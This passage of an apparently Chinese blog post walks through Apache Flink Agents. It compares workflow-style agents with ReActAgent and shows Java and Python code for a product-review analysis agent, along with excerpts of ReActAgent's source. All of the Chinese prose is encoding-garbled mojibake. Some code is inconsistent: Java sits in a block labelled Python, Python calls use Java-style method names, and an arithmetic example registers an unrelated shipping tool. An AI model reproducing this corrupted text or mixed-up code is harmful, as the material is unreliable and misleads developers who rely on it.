Agent</p>\n<ul>\n<li>å…·æœ‰å›ºå®šåºåˆ—æˆ–æ¡ä»¶åˆ†æ”¯çš„å¤šæ­¥éª¤æµç¨‹</li>\n<li>éœ€è¦ç²¾ç¡®æŽ§åˆ¶ä»£ç†è¡Œä¸ºçš„åœºæ™¯</li>\n<li>åœ¨é¢„å®šé¡ºåºä¸­ä¸Žå¤šä¸ªå¤–éƒ¨ç³»ç»Ÿé›†æˆ</li>\n</ul>\n<p>ReActAgent</p>\n<ul>\n<li>éœ€è¦ LLM æŽ¨ç†ä½¿ç”¨å“ªäº›å·¥å…·/æ“ä½œçš„ä»»åŠ¡</li>\n<li>å¸¦å·¥å…·ä½¿ç”¨çš„æ ‡å‡†é—®ç­”</li>\n<li>LLM åº”è¯¥åŠ¨æ€å†³å®šå·¥ä½œæµç¨‹çš„åœºæ™¯</li>\n</ul>\n<p>åªè¦â€œé—®é¢˜ä¸å¯å®Œå…¨ç©·ä¸¾ã€è¦è·¨å¤šç³»ç»ŸæŸ¥è¯ã€å¹¶ä¸”éœ€è¦åœ¨å¯¹è¯ä¸­æ¾„æ¸…/åå•†/å†³ç­–â€ï¼Œå°±æ›´åº”è¯¥ç”¨ReActAgentï¼Œè€Œä¸æ˜¯çº¯ Workflowã€‚</p>\n<h4 id=\"215-å¼€å‘å¤æ‚åº¦\">2.1.5 å¼€å‘å¤æ‚åº¦</h4>\n<p>Workflow Style Agent</p>\n<ul>\n<li>æ›´é«˜çµæ´»æ€§ï¼šéœ€è¦æ›´å¤šä»£ç ä½†æŽ§åˆ¶åŠ›æ›´å¼º</li>\n<li>è‡ªå®šä¹‰é€»è¾‘ï¼šéœ€è¦å®žçŽ°æ‰€æœ‰åŠ¨ä½œé€»è¾‘</li>\n<li>æ— ä¸»è§ï¼šå¼€å‘äººå‘˜æŽ§åˆ¶ä»£ç†è¡Œä¸ºçš„æ‰€æœ‰æ–¹é¢</li>\n</ul>\n<p>ReActAgent</p>\n<ul>\n<li>è¾ƒä½Žé—¨æ§›ï¼šæ›´å®¹æ˜“ä¸Šæ‰‹ï¼Œå…·æœ‰é¢„å®šä¹‰åŠŸèƒ½</li>\n<li>ä»£ç é‡å°‘ï¼šè®¾ç½®æ‰€éœ€çš„ä»£ç æœ€å°‘</li>\n<li>æœ‰ä¸»è§ï¼šä»£è¡¨å¼€å‘äººå‘˜åšå‡ºè®¸å¤šå†³ç­–</li>\n</ul>\n<h4 id=\"216-æ€»ç»“\">2.1.6 æ€»ç»“</h4>\n<p>ReActAgent ä¸ºæ ‡å‡†çš„åŸºäºŽ LLM çš„æŽ¨ç†ä»»åŠ¡æä¾›äº†çŽ°æˆçš„è§£å†³æ–¹æ¡ˆï¼Œè€Œ Workflow Style Agent ä¸ºå¤æ‚çš„è‡ªå®šä¹‰ä»£ç†å®žçŽ°æä¾›äº†æœ€å¤§çš„çµæ´»æ€§ã€‚</p>\n<p>æœ‰äººæˆç§°ï¼šæ‹‰æŠ•èµ„ç”¨ Agent è®²æ•…äº‹ï¼Œåšä¸šåŠ¡è¸è¸å®žå®žç”¨ Workflow ã€‚è¿™å¥çŽ©ç¬‘èƒŒåŽæŠ˜å°„å‡ºçŽ°å®žçš„è€ƒé‡ï¼šWorkflow èƒœåœ¨ç¡®å®šæ€§ï¼Œè€Œ Agent èƒœåœ¨ä¸Šé™ã€‚</p>\n<h3 id=\"22-workflow\">2.2 workflow</h3>\n<p>å®˜æ–¹çš„å¿«é€Ÿå…¥é—¨ï¼ˆdocs\\content\\docs\\get-started\\quickstart\\workflow_agent.mdï¼‰é€šè¿‡ä¸¤ä¸ªæ¸è¿›å¼æµå¼ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ç”¨ Flink Agents æž„å»ºç”±å¤§æ¨¡åž‹é©±åŠ¨çš„æµæ°´çº¿ï¼š</p>\n<ul>\n<li><strong>è¯„è®ºåˆ†æž</strong>ï¼šç¤ºä¾‹ä¸€ ä¼šæŒç»­æŽ¥æ”¶å•†å“è¯„è®ºæµï¼Œå¹¶ç”¨å•ä¸ªä»£ç†ä»Žæ¯æ¡è¯„è®ºä¸­æå–è¯„åˆ†ï¼ˆ1-5ï¼‰ä»¥åŠä¸æ»¡æ„åŽŸå› ã€‚</li>\n<li><strong>äº§å“æ”¹è¿›å»ºè®®</strong>ï¼šåœ¨ç¤ºä¾‹ä¸€çš„åŸºç¡€ä¸Šï¼ŒæŒ‰çª—å£èšåˆæ¯æ¡è¯„è®ºçš„åˆ†æžç»“æžœï¼Œç”Ÿæˆå•†å“çº§åˆ«çš„æ±‡æ€»ï¼ˆè¯„åˆ†åˆ†å¸ƒã€å¸¸è§æŠ±æ€¨ï¼‰ï¼Œå†è°ƒç”¨ç¬¬äºŒä¸ªä»£ç†ä¸ºæ¯ä»¶å•†å“è¾“å‡ºå…·ä½“çš„æ”¹è¿›å»ºè®®ã€‚</li>\n</ul>\n<p>ä¸¤ä¸ªç¤ºä¾‹åˆåœ¨ä¸€èµ·ï¼Œæ¼”ç¤ºäº†å¦‚ä½•ç”¨ Flink Agents æž„å»ºå¤šä»£ç†å·¥ä½œæµï¼Œå¹¶ç›´æŽ¥åœ¨ Flink ç‹¬ç«‹é›†ç¾¤ä¸Šè¿è¡Œã€‚</p>\n<h4 id=\"221-ä»£ç å¯¼è¯»\">2.2.1 ä»£ç å¯¼è¯»</h4>\n<h5 id=\"å‡†å¤‡ä»£ç†æ‰§è¡ŒçŽ¯å¢ƒ\">å‡†å¤‡ä»£ç†æ‰§è¡ŒçŽ¯å¢ƒ</h5>\n<p>åˆ›å»º Agents æ‰§è¡ŒçŽ¯å¢ƒï¼Œæ³¨å†Œå¯ä¾›ä»£ç†ä½¿ç”¨çš„èŠå¤©æ¨¡åž‹è¿žæŽ¥ã€‚</p>\n<pre><code class=\"language-Java\">// Set up the Flink streaming environment and the Agents execution environment.\nStreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();\nAgentsExecutionEnvironment agentsEnv =\n        AgentsExecutionEnvironment.getExecutionEnvironment(env);\n\n// Add Ollama chat model connection to be used by the ReviewAnalysisAgent.\nagentsEnv.addResource(\n        \"ollamaChatModelConnection\",\n        ResourceType.CHAT_MODEL_CONNECTION,\n        CustomTypesAndResources.OLLAMA_SERVER_DESCRIPTOR);\n</code></pre>\n<h5 id=\"åˆ›å»ºä»£ç†\">åˆ›å»ºä»£ç†</h5>\n<p>ä»¥ <code>ReviewAnalysisAgent</code> ä¸ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•å®šä¹‰æç¤ºè¯ã€å·¥å…·ã€èŠå¤©æ¨¡åž‹å’ŒåŠ¨ä½œï¼›ä»¥åŠå¦‚ä½•å¤„ç†èŠå¤©å“åº”å¹¶å‘é€è¾“å‡ºäº‹ä»¶ã€‚æ›´å¤šç»†èŠ‚è¯·å‚è€ƒ [å·¥ä½œæµä»£ç†] æ–‡æ¡£ã€‚<code>ProductSuggestionAgent</code> çš„ä»£ç ä¸Žä¹‹ç±»ä¼¼ã€‚</p>\n<pre><code class=\"language-Java\">/**\n * An agent that uses a large language model (LLM) to analyze product reviews and generate a\n * satisfaction score and potential reasons for dissatisfaction.\n *\n * &lt;p&gt;This agent receives a product review and produces a satisfaction score and a list of reasons\n * for dissatisfaction. It handles prompt construction, LLM interaction, and output parsing.\n */\npublic class ReviewAnalysisAgent extends Agent {\n\n    private static final ObjectMapper MAPPER = new ObjectMapper();\n\n    @Prompt\n    public static org.apache.flink.agents.api.prompt.Prompt reviewAnalysisPrompt() {\n        return REVIEW_ANALYSIS_PROMPT;\n    }\n\n    @ChatModelSetup\n    public static ResourceDescriptor reviewAnalysisModel() {\n        return ResourceDescriptor.Builder.newBuilder(OllamaChatModelSetup.class.getName())\n                .addInitialArgument(\"connection\", \"ollamaChatModelConnection\")\n                .addInitialArgument(\"model\", \"qwen3:8b\")\n                .addInitialArgument(\"prompt\", \"reviewAnalysisPrompt\")\n                .addInitialArgument(\"tools\", Collections.singletonList(\"notifyShippingManager\"))\n                .addInitialArgument(\"extract_reasoning\", \"true\")\n                .build();\n    }\n\n    /**\n     * Tool for notifying the shipping manager when product received a negative review due to\n     * shipping damage.\n     *\n     * @param id The id of the product that received a negative review due to shipping damage\n     * @param review The negative review content\n     */\n    @Tool(\n            description =\n                    \"Notify the shipping manager when product received a negative review due to shipping damage.\")\n    public static void notifyShippingManager(\n            @ToolParam(name = \"id\") String id, @ToolParam(name = \"review\") String review) {\n        CustomTypesAndResources.notifyShippingManager(id, review);\n    }\n\n    /** Process input event and send chat request for review analysis. */\n    @Action(listenEvents = {InputEvent.class})\n    public static void processInput(InputEvent event, RunnerContext ctx) throws Exception {\n        String input = (String) event.getInput();\n        MAPPER.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);\n        CustomTypesAndResources.ProductReview inputObj =\n                MAPPER.readValue(input, CustomTypesAndResources.ProductReview.class);\n\n        ctx.getShortTermMemory().set(\"id\", inputObj.getId());\n\n        String content =\n                String.format(\n                        \"{\\n\" + \"\\\"id\\\": %s,\\n\" + \"\\\"review\\\": \\\"%s\\\"\\n\" + \"}\",\n                        inputObj.getId(), inputObj.getReview());\n        ChatMessage msg = new ChatMessage(MessageRole.USER, \"\", Map.of(\"input\", content));\n\n        ctx.sendEvent(new ChatRequestEvent(\"reviewAnalysisModel\", List.of(msg)));\n    }\n\n    @Action(listenEvents = ChatResponseEvent.class)\n    public static void processChatResponse(ChatResponseEvent event, RunnerContext ctx)\n            throws Exception {\n        JsonNode jsonNode = MAPPER.readTree(event.getResponse().getContent());\n        JsonNode scoreNode = jsonNode.findValue(\"score\");\n        JsonNode reasonsNode = jsonNode.findValue(\"reasons\");\n        if (scoreNode == null || reasonsNode == null) {\n            throw new IllegalStateException(\n                    \"Invalid response from LLM: missing 'score' or 'reasons' field.\");\n        }\n        List&lt;String&gt; result = new ArrayList&lt;&gt;();\n        if (reasonsNode.isArray()) {\n            for (JsonNode node : reasonsNode) {\n                result.add(node.asText());\n            }\n        }\n\n        ctx.sendEvent(\n                new OutputEvent(\n                        new CustomTypesAndResources.ProductReviewAnalysisRes(\n                                ctx.getShortTermMemory().get(\"id\").getValue().toString(),\n                                scoreNode.asInt(),\n                                result)));\n    }\n}\n</code></pre>\n<h5 id=\"ä¸Ž-flink-é›†æˆ\">ä¸Ž Flink é›†æˆ</h5>\n<p>è¯»å–æ–‡æœ¬æ–‡ä»¶ä¸­çš„å•†å“è¯„è®ºæµä½œä¸ºè¾“å…¥ DataStreamï¼Œç”¨ <code>ReviewAnalysisAgent</code> åˆ†æžå¹¶ç”Ÿæˆç»“æžœ DataStreamï¼Œæœ€åŽæ‰“å°è¾“å‡ºã€‚</p>\n<pre><code class=\"language-Java\">// Read product reviews from input_data.txt file as a streaming source.\n// Each element represents a ProductReview.\nDataStream&lt;String&gt; productReviewStream =\n       env.fromSource(\n               FileSource.forRecordStreamFormat(\n                               new TextLineInputFormat(),\n                               new Path(inputDataFile.getAbsolutePath()))\n                       .build(),\n               WatermarkStrategy.noWatermarks(),\n               \"streaming-agent-example\");\n\n// Use the ReviewAnalysisAgent to analyze each product review.\nDataStream&lt;Object&gt; reviewAnalysisResStream =\n       agentsEnv\n               .fromDataStream(productReviewStream)\n               .apply(new ReviewAnalysisAgent())\n               .toDataStream();\n\n// Print the analysis results to stdout.\nreviewAnalysisResStream.print();\n\n// Execute the Flink pipeline.\nagentsEnv.execute();\n</code></pre>\n<h3 id=\"23-react-agent\">2.3 ReAct Agent</h3>\n<p>æœ¬å¿«é€Ÿå…¥é—¨ç”¨ä¸€ä¸ªè¿·ä½ ç¤ºä¾‹æ¼”ç¤ºå¦‚ä½•ç”¨ Flink Agents æž„å»ºæµå¼ ReAct Agentï¼š</p>\n<p><strong>è¯„è®ºåˆ†æž</strong> ä»£ç†æŒç»­æ¶ˆè´¹å•†å“è¯„è®ºæµï¼Œç”¨å•ä¸ªä»£ç†æå–è¯„åˆ†ï¼ˆ1-5ï¼‰ä»¥åŠä¸æ»¡æ„åŽŸå› ï¼›è‹¥è¯„è®ºæ¶‰åŠç‰©æµä¸æ»¡ï¼Œåˆ™è‡ªåŠ¨é€šçŸ¥ç‰©æµç»ç†ã€‚</p>\n<h4 id=\"231-ä»£ç å¯¼è¯»\">2.3.1 ä»£ç å¯¼è¯»</h4>\n<h5 id=\"å‡†å¤‡ä»£ç†æ‰§è¡ŒçŽ¯å¢ƒ-1\">å‡†å¤‡ä»£ç†æ‰§è¡ŒçŽ¯å¢ƒ</h5>\n<p>åˆ›å»º Agents æ‰§è¡ŒçŽ¯å¢ƒï¼Œæ³¨å†Œå¯ç”¨çš„èŠå¤©æ¨¡åž‹è¿žæŽ¥ä¸Žå·¥å…·ã€‚</p>\n<pre><code class=\"language-python\"># Set up the Flink streaming environment and the Agents execution environment.\nenv = StreamExecutionEnvironment.get_execution_environment()\nagents_env = AgentsExecutionEnvironment.get_execution_environment(env)\n\n# Add Ollama chat model connection and notify shipping manager tool to be used\n# by the Agent.\nagents_env.add_resource(\n    \"ollama_server\",\n    ResourceDescriptor(clazz=OllamaChatModelConnection, request_timeout=120),\n).add_resource(\n    \"notify_shipping_manager\", Tool.from_callable(notify_shipping_manager)\n)\n</code></pre>\n<h5 id=\"åˆ›å»º-react-agent\">åˆ›å»º ReAct Agent</h5>\n<p>å®žä¾‹åŒ– ReAct Agentï¼Œé…ç½®èŠå¤©æ¨¡åž‹ã€æç¤ºè¯ä»¥åŠç»“æžœçš„è¾“å‡ºæ¨¡å¼ã€‚</p>\n<pre><code class=\"language-python\">review_analysis_react_agent = ReActAgent(\n    chat_model=ResourceDescriptor(\n        clazz=OllamaChatModelSetup,\n        connection=\"ollama_server\",\n        model=\"qwen3:8b\",\n        tools=[\"notify_shipping_manager\"],\n    ),\n    prompt=review_analysis_react_prompt,\n    output_schema=ProductReviewAnalysisRes,\n)\n</code></pre>\n<h5 id=\"ä¸Ž-flink-é›†æˆ-1\">ä¸Ž Flink é›†æˆ</h5>\n<p>è¯»å–å•†å“è¯„è®ºæ–‡æœ¬æ–‡ä»¶ç”Ÿæˆ Source DataStreamï¼Œç”¨ ReAct Agent åˆ†æžå¹¶ç”Ÿæˆç»“æžœ DataStreamï¼Œæœ€åŽæ‰“å°è¾“å‡ºã€‚</p>\n<pre><code class=\"language-python\"># Read product reviews from a text file as a streaming source.\n# Each line in the file should be a JSON string representing a ProductReview.\nproduct_review_stream = env.from_source(\n    source=FileSource.for_record_stream_format(\n        StreamFormat.text_line_format(),\n        f\"file:///{current_dir}/resources/\",\n    )\n    .monitor_continuously(Duration.of_minutes(1))\n    .build(),\n    watermark_strategy=WatermarkStrategy.no_watermarks(),\n    source_name=\"streaming_agent_example\",\n).map(\n    lambda x: ProductReview.model_validate_json(\n        x\n    )  # Deserialize JSON to ProductReview.\n)\n\n# Use the ReAct agent to analyze each product review and notify the shipping manager\n# when needed.\nreview_analysis_res_stream = (\n    agents_env.from_datastream(\n        input=product_review_stream, key_selector=lambda x: x.id\n    )\n    .apply(review_analysis_react_agent)\n    .to_datastream()\n)\n\n# Print the analysis results to stdout.\nreview_analysis_res_stream.print()\n</code></pre>\n<h2 id=\"0x03-reactagent\">0x03 ReActAgent</h2>\n<p>ReActAgent æ˜¯ Agent æŠ½è±¡çš„ä¸€ä¸ªå…·ä½“å®žçŽ°ï¼Œå±•ç¤ºäº†è¿™äº›æŠ½è±¡å¦‚ä½•ååŒå·¥ä½œã€‚</p>\n<ul>\n<li>èµ„æºç®¡ç†ï¼šç®¡ç†èŠå¤©æ¨¡åž‹å’Œæç¤ºè¯èµ„æº</li>\n<li>Actionå®šä¹‰ï¼šå®šä¹‰ start_action å’Œ stop_action å¤„ç†è¾“å…¥å’Œè¾“å‡º</li>\n<li>äº‹ä»¶å¤„ç†ï¼šå“åº” InputEvent å’Œ ChatResponseEvent</li>\n<li>é…ç½®ç®¡ç†ï¼šæ”¯æŒé”™è¯¯å¤„ç†ç­–ç•¥é…ç½®</li>\n<li>è¾“å‡ºæ ¼å¼åŒ–ï¼šæ”¯æŒåŸºäºŽ schema çš„è¾“å‡ºéªŒè¯å’Œæ ¼å¼åŒ–</li>\n</ul>\n<p>è¿™ç§æŠ½è±¡è®¾è®¡ä½¿å¾— Agent ç³»ç»Ÿå…·æœ‰é«˜åº¦çš„çµæ´»æ€§å’Œå¯æ‰©å±•æ€§ï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡ç»„åˆä¸åŒçš„èµ„æºã€actionså’Œé…ç½®æ¥æž„å»ºæ»¡è¶³ç‰¹å®šéœ€æ±‚çš„Agentã€‚</p>\n<h3 id=\"31-å®šä¹‰\">3.1 å®šä¹‰</h3>\n<p>ReActAgent çš„å®šä¹‰å¦‚ä¸‹ã€‚</p>\n<pre><code class=\"language-python\">class ReActAgent(Agent):\n    \"\"\"Built-in implementation of ReAct agent which is based on the function\n    call ability of llm.\n\n    This implementation is not based on the foundational ReAct paper which uses\n    prompt to force llm output contain &lt;Thought&gt;, &lt;Action&gt; and &lt;Observation&gt; and\n    extract tool calls by text parsing. For a more robust and feature-rich\n    implementation we use the tool/function call ability of current llm, and get\n    the tool calls from response directly.\n\n    Example:\n        ::\n\n            class OutputData(BaseModel):\n                result: int\n\n\n            env = AgentsExecutionEnvironment.get_execution_environment()\n\n            # register resource to execution environment\n            (\n                env.add_resource(\n                    \"ollama\",\n                    ResourceDescriptor(clazz=OllamaChatModelConnection, model=model),\n                )\n                .add_resource(\"add\", add)\n                .add_resource(\"multiply\", multiply)\n            )\n\n            # prepare prompt\n            prompt = Prompt.from_messages(\n                messages=[\n                    ChatMessage(\n                        role=MessageRole.SYSTEM,\n                        content='An example of output is {\"result\": 30.32}.',\n                    ),\n                    ChatMessage(\n                        role=MessageRole.USER, content=\"What is ({a} + {b}) * {c}\"\n                    ),\n                ],\n            )\n\n            # create ReAct agent.\n            agent = ReActAgent(\n                chat_model=ResourceDescriptor(\n                    clazz=OllamaChatModelSetup,\n                    connection=\"ollama_server\",\n                    tools=[\"notify_shipping_manager\"],\n                ),\n                prompt=prompt,\n                output_schema=OutputData,\n            )\n    \"\"\"\n\n    def __init__(\n        self,\n        *,\n        chat_model: ResourceDescriptor,\n        prompt: Prompt | None = None,\n        output_schema: type[BaseModel] | RowTypeInfo | None = None,\n    ) -&gt; None:\n        \"\"\"Init method of ReActAgent.\n\n        Parameters\n        ----------\n        chat_model : ResourceDescriptor\n            The descriptor of the chat model used in this ReAct agent.\n        prompt : Optional[Prompt] = None\n            Prompt to instruct the llm, could include input and output example,\n            task and so on.\n        output_schema : Optional[Union[type[BaseModel], RowTypeInfo]] = None\n            The schema should be RowTypeInfo or subclass of BaseModel. When user\n            provide output schema, ReAct agent will add system prompt to instruct\n            response format of llm, and add output parser according to the schema.\n        \"\"\"\n        super().__init__()\n        self.add_resource(_DEFAULT_CHAT_MODEL, chat_model)\n\n        if output_schema:\n            if isinstance(output_schema, type) and issubclass(output_schema, BaseModel):\n                json_schema = output_schema.model_json_schema()\n            elif isinstance(output_schema, RowTypeInfo):\n                json_schema = str(output_schema)\n            else:\n                err_msg = f\"Output schema {output_schema.__class__} is not supported.\"\n                raise TypeError(err_msg)\n            schema_prompt = f\"The final response should be json format, and match the schema {json_schema}.\"\n            self._resources[ResourceType.PROMPT][_DEFAULT_SCHEMA_PROMPT] = (\n                Prompt.from_text(text=schema_prompt)\n            )\n\n        if prompt:\n            self._resources[ResourceType.PROMPT][_DEFAULT_USER_PROMPT] = prompt\n\n        self.add_action(\n            name=\"stop_action\",\n            events=[ChatResponseEvent],\n            func=self.stop_action,\n            output_schema=OutputSchema(output_schema=output_schema),\n        )\n</code></pre>\n<h3 id=\"32-æ·±åº¦å®šåˆ¶\">3.2 æ·±åº¦å®šåˆ¶</h3>\n<p>Flink å¯¹ ReActAgent åšäº†æ·±åº¦å®šåˆ¶ï¼Œä½¿å…¶èƒ½åœ¨åˆ†å¸ƒå¼æµå¤„ç†çŽ¯å¢ƒä¸­é«˜æ•ˆæ‰§è¡Œï¼Œå¹¶æä¾›äº†ä¸°å¯Œçš„åŠŸèƒ½æ¥ç®€åŒ– LLM åº”ç”¨å¼€å‘ã€‚</p>\n<h4 id=\"321-reactagent-ç‰¹è‰²\">3.2.1 ReActAgent ç‰¹è‰²</h4>\n<h5 id=\"æµå¼å¤„ç†é€‚é…\">æµå¼å¤„ç†é€‚é…</h5>\n<p>Flink å°†ä¼ ç»Ÿçš„ ReAct æ¨¡å¼é€‚é…åˆ°äº†æµå¤„ç†çŽ¯å¢ƒä¸­ï¼š</p>\n<ul>\n<li>é€šè¿‡ InputEvent å’Œ OutputEvent åŒ…è£…è¾“å…¥è¾“å‡ºæ•°æ®</li>\n<li>åˆ©ç”¨ Flink çš„äº‹ä»¶é©±åŠ¨æž¶æž„å®žçŽ°å¼‚æ­¥å¤„ç†</li>\n<li>é€šè¿‡ RunnerContext ç®¡ç†çŠ¶æ€å’Œèµ„æº</li>\n</ul>\n<pre><code class=\"language-python\">agents_env = AgentsExecutionEnvironment.get_execution_environment(env)\nagents_env.fromDataStream(dataStream) # ä»ŽDataStreamè¾“å…¥\nagents_env.fromTable(table) # ä»ŽTableè¾“å…¥\nagents_env.fromList(list) # ä»ŽListè¾“å…¥\n\nreview_analysis_res_stream = (\n        agents_env.from_datastream( # ä»ŽDataSteamåˆ›å»ºAgentæµç¨‹\n            input=product_review_stream, key_selector=lambda x: x.id\n        )\n        .apply(review_analysis_react_agent) # åº”ç”¨Agent\n        .to_datastream() # è½¬æ¢å›žStream\n    )\n</code></pre>\n<h5 id=\"ç‰¹å®šçš„è¡Œä¸ºæ¨¡å¼\">ç‰¹å®šçš„è¡Œä¸ºæ¨¡å¼</h5>\n<p>ReActAgent å®žçŽ°äº†ç‰¹å®šçš„ ReActï¼ˆReasoning + Actionï¼‰èŒƒå¼ï¼Œè¿™æ˜¯ä¸€ç§ç»“åˆæŽ¨ç†å’Œè¡ŒåŠ¨çš„ AI Agent æ¨¡å¼ã€‚å®ƒå†…ç½®äº†ä¸¤ä¸ªæ ¸å¿ƒåŠ¨ä½œï¼šstart_action()å’Œ stop_action()ã€‚ä½¿ç”¨é¢„å®šä¹‰çš„æµç¨‹æ¥å¤„ç†è¾“å…¥å¹¶ç”Ÿæˆè¾“å‡ºï¼Œè€Œéžè®©ç”¨æˆ·å®Œå…¨è‡ªå®šä¹‰è¡Œä¸ºé€»è¾‘ã€‚</p>\n<ul>\n<li>start_action æŽ¥æ”¶è¾“å…¥å¹¶å‘é€ ChatRequestEvent</li>\n<li>stop_action å¤„ç† ChatResponseEvent å¹¶äº§ç”Ÿæœ€ç»ˆè¾“å‡º</li>\n</ul>\n<h5 id=\"é”®æŽ§çŠ¶æ€æ”¯æŒ\">é”®æŽ§çŠ¶æ€æ”¯æŒ</h5>\n<p>æ”¯æŒFlinkçš„é”®æŽ§çŠ¶æ€ç‰¹æ€§</p>\n<pre><code class=\"language-python\">review_analysis_res_stream = (\n    agents_env.from_datastream(\n        input=product_review_stream, key_selector=lambda x: x.id\n    )\n    .apply(review_analysis_react_agent)\n    .to_datastream()\n)\n</code></pre>\n<h5 id=\"llm-é›†æˆä¼˜åŒ–\">LLM é›†æˆä¼˜åŒ–</h5>\n<p>ReActAgent ä¸“é—¨ä¸º LLM äº¤äº’è¿›è¡Œä¼˜åŒ–ï¼šå†…ç½®äº†æç¤ºè¯ç®¡ç†å’Œæ ¼å¼åŒ–åŠŸèƒ½ï¼›æ”¯æŒç»“æž„åŒ–è¾“å‡ºæ¨¡å¼ï¼Œå¯ä»¥æŒ‡å®šè¾“å‡ºçš„æ•°æ®schemaï¼›é›†æˆäº†é”™è¯¯å¤„ç†ç­–ç•¥ï¼Œå½“LLMè¾“å‡ºä¸ç¬¦åˆé¢„æœŸæ ¼å¼æ—¶å¯ä»¥é€‰æ‹©å¤±è´¥æˆ–è€…å¿½ç•¥ã€‚</p>\n<h5 id=\"èµ„æºç®¡ç†æ–¹å¼\">èµ„æºç®¡ç†æ–¹å¼</h5>\n<p>ReActAgent ä¸­è‡ªåŠ¨æ·»åŠ é»˜è®¤èµ„æºï¼Œç›¸æ¯”æ™®é€šçš„Agentï¼ŒReActAgent ä¼šè‡ªåŠ¨ä¸ºç”¨æˆ·è®¾ç½®å¥½å¿…è¦çš„èµ„æºï¼Œç®€åŒ–ä½¿ç”¨æµç¨‹ã€‚é€šè¿‡ç»Ÿä¸€çš„èµ„æºç®¡ç†ç³»ç»Ÿä¸ŽFlinké›†æˆã€‚ReActAgent é€šè¿‡ _DEFAULT_CHAT_MODEL ç­‰å¸¸é‡å¼•ç”¨åœ¨ AgentsExecutionEnvironment ä¸­æ³¨å†Œçš„èµ„æºã€‚</p>\n<pre><code class=\"language-python\">agents_env.add_resource(_DEFAULT_CHAT_MODEL, chat_model)\nagents_env.addResource(\"ollama_server\", ResourceDescriptor(...))\nagents_env.addResource(\"notify_shipping_manager\", Tool.from_callable(...))\n</code></pre>\n<h5 id=\"ç±»åž‹ä¿¡æ¯å¤„ç†\">ç±»åž‹ä¿¡æ¯å¤„ç†</h5>\n<p>Flink Agentèƒ½å¤Ÿå¤„ç†Flinkçš„ç±»åž‹ç³»ç»Ÿ</p>\n<pre><code class=\"language-python\">        if (outputSchema != null) {\n            String jsonSchema;\n            // æ”¯æŒRowTypeInfoå’ŒPOJOç±»åž‹\n            if (outputSchema instanceof RowTypeInfo) {\n            \t// å¤„ç†Rowç±»åž‹\n                jsonSchema = outputSchema.toString();\n                outputSchema = new OutputSchema((RowTypeInfo) outputSchema);\n            } else if (outputSchema instanceof Class) {\n            \t// å¤„ç†POJOç±»åž‹\n                try {\n                    jsonSchema = mapper.generateJsonSchema((Class&lt;?&gt;) outputSchema).toString();\n                } catch (JsonMappingException e) {\n                    throw new RuntimeException(e);\n                }\n            } \n</code></pre>\n<h5 id=\"é”™è¯¯å¤„ç†æœºåˆ¶\">é”™è¯¯å¤„ç†æœºåˆ¶</h5>\n<p>Flink ä¸º ReActAgent å®žçŽ°äº†çµæ´»çš„å¤„ç†å¤„ç†ç­–ç•¥ï¼Œè¿è¡Œç”¨æˆ·é€‰æ‹©åœ¨è§£æžå¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸è¿˜æ˜¯å¿½ç•¥é”™è¯¯ã€‚</p>\n<pre><code class=\"language-python\">        except Exception:\n            if error_handling_strategy == ErrorHandlingStrategy.IGNORE:\n                logging.warning(\n                    f\"The response of llm {output} doesn't match schema constraint, ignoring.\"\n                )\n                return\n            elif error_handling_strategy == ErrorHandlingStrategy.FAIL:\n                raise\n</code></pre>\n<h5 id=\"ç»“æž„åŒ–è¾“å‡ºæ”¯æŒ\">ç»“æž„åŒ–è¾“å‡ºæ”¯æŒ</h5>\n<p>Flink ä¸º ReActAgent æ·»åŠ äº†ç»“æž„åŒ–è¾“å‡ºçš„èƒ½åŠ›ï¼Œè¿™æ ·å¯ä»¥è®© LLM çš„è¾“å‡ºç¬¦åˆé¢„å®šä¹‰çš„æ•°æ®ç»“æž„ï¼Œä¾¿äºŽåŽç»­ç®¡ç†ã€‚</p>\n<pre><code class=\"language-python\">        if output_schema:\n            if isinstance(output_schema, type) and issubclass(output_schema, BaseModel):\n                json_schema = output_schema.model_json_schema()\n            elif isinstance(output_schema, RowTypeInfo):\n                json_schema = str(output_schema)\n            else:\n                err_msg = f\"Output schema {output_schema.__class__} is not supported.\"\n                raise TypeError(err_msg)\n            schema_prompt = f\"The final response should be json format, and match the schema {json_schema}.\"\n            self._resources[ResourceType.PROMPT][_DEFAULT_SCHEMA_PROMPT] = (\n                Prompt.from_text(text=schema_prompt)\n            )\n</code></pre>\n<h5 id=\"æç¤ºè¯æ¨¡æ¿ç³»ç»Ÿ\">æç¤ºè¯æ¨¡æ¿ç³»ç»Ÿ</h5>\n<p>Flink å®žçŽ°äº†ä¸€ä¸ªå®Œæ•´çš„æç¤ºè¯æ¨¡æ¿ç®¡ç†ç³»ç»Ÿï¼š</p>\n<ul>\n<li>æ”¯æŒå­—ç¬¦ä¸²æ¨¡æ¿å’Œæ¶ˆæ¯åˆ—è¡¨æ¨¡åž‹</li>\n<li>æä¾›æ ¼å¼åŒ–åŠŸèƒ½ï¼Œå¯ä»¥åŠ¨æ€æ›¿æ¢æ¨¡æ¿ä¸­çš„å ä½ç¬¦</li>\n<li>è‡ªåŠ¨å¤„ç†ä¸åŒç±»åž‹è¾“å…¥çš„è½¬æ¢</li>\n</ul>\n<h5 id=\"å·¥å…·è°ƒç”¨é›†æˆ\">å·¥å…·è°ƒç”¨é›†æˆ</h5>\n<p>Flink å°†å·¥å…·è°ƒç”¨é›†æˆåˆ° ReActAgentä¸­ã€‚</p>\n<pre><code class=\"language-python\"># æ³¨å†Œå·¥å…·èµ„æº\n    # Add Ollama chat model connection and notify shipping manager tool to be used\n    # by the Agent.\n    agents_env.add_resource(\n        \"ollama_server\",\n        ResourceDescriptor(clazz=OllamaChatModelConnection, request_timeout=120),\n    ).add_resource(\n        \"notify_shipping_manager\", Tool.from_callable(notify_shipping_manager)\n    )\n    \n# åœ¨Agent ä¸­ä½¿ç”¨å·¥å…·\n    # Create react agent\n    review_analysis_react_agent = ReActAgent(\n        chat_model=ResourceDescriptor(\n            clazz=OllamaChatModelSetup,\n            connection=\"ollama_server\",\n            model=\"qwen3:8b\",\n            tools=[\"notify_shipping_manager\"],\n        ),\n        prompt=review_analysis_react_prompt,\n        output_schema=ProductReviewAnalysisRes,\n    )\n</code></pre>\n<h5 